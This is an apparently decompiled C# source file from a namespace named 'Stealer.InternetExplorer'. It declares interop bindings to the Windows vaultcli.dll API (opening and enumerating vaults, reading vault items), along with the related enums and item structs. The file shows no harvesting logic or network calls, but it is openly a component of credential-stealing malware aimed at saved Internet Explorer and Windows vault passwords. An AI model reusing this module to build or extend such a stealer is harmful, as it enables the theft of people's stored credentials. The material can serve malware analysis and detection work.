using System;
using System.Runtime.InteropServices;

namespace Stealer.InternetExplorer
{
	// Token: 0x0200002C RID: 44
	public static class VaultCli
	{
		// Token: 0x060000C7 RID: 199
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x060000C8 RID: 200
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x060000C9 RID: 201
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x060000CA RID: 202
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x060000CB RID: 203
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x060000CC RID: 204
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x060000CD RID: 205
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x02000065 RID: 101
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x04000106 RID: 262
			Undefined = -1,
			// Token: 0x04000107 RID: 263
			Boolean,
			// Token: 0x04000108 RID: 264
			Short,
			// Token: 0x04000109 RID: 265
			UnsignedShort,
			// Token: 0x0400010A RID: 266
			Int,
			// Token: 0x0400010B RID: 267
			UnsignedInt,
			// Token: 0x0400010C RID: 268
			Double,
			// Token: 0x0400010D RID: 269
			Guid,
			// Token: 0x0400010E RID: 270
			String,
			// Token: 0x0400010F RID: 271
			ByteArray,
			// Token: 0x04000110 RID: 272
			TimeStamp,
			// Token: 0x04000111 RID: 273
			ProtectedArray,
			// Token: 0x04000112 RID: 274
			Attribute,
			// Token: 0x04000113 RID: 275
			Sid,
			// Token: 0x04000114 RID: 276
			Last
		}

		// Token: 0x02000066 RID: 102
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x04000116 RID: 278
			Illegal,
			// Token: 0x04000117 RID: 279
			Resource,
			// Token: 0x04000118 RID: 280
			Identity,
			// Token: 0x04000119 RID: 281
			Authenticator,
			// Token: 0x0400011A RID: 282
			Tag,
			// Token: 0x0400011B RID: 283
			PackageSid,
			// Token: 0x0400011C RID: 284
			AppStart = 100,
			// Token: 0x0400011D RID: 285
			AppEnd = 10000
		}

		// Token: 0x02000067 RID: 103
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x0400011E RID: 286
			public Guid SchemaId;

			// Token: 0x0400011F RID: 287
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000120 RID: 288
			public IntPtr pResourceElement;

			// Token: 0x04000121 RID: 289
			public IntPtr pIdentityElement;

			// Token: 0x04000122 RID: 290
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000123 RID: 291
			public IntPtr pPackageSid;

			// Token: 0x04000124 RID: 292
			public ulong LastModified;

			// Token: 0x04000125 RID: 293
			public uint dwFlags;

			// Token: 0x04000126 RID: 294
			public uint dwPropertiesCount;

			// Token: 0x04000127 RID: 295
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000068 RID: 104
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x04000128 RID: 296
			public Guid SchemaId;

			// Token: 0x04000129 RID: 297
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x0400012A RID: 298
			public IntPtr pResourceElement;

			// Token: 0x0400012B RID: 299
			public IntPtr pIdentityElement;

			// Token: 0x0400012C RID: 300
			public IntPtr pAuthenticatorElement;

			// Token: 0x0400012D RID: 301
			public ulong LastModified;

			// Token: 0x0400012E RID: 302
			public uint dwFlags;

			// Token: 0x0400012F RID: 303
			public uint dwPropertiesCount;

			// Token: 0x04000130 RID: 304
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000069 RID: 105
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x04000131 RID: 305
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x04000132 RID: 306
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
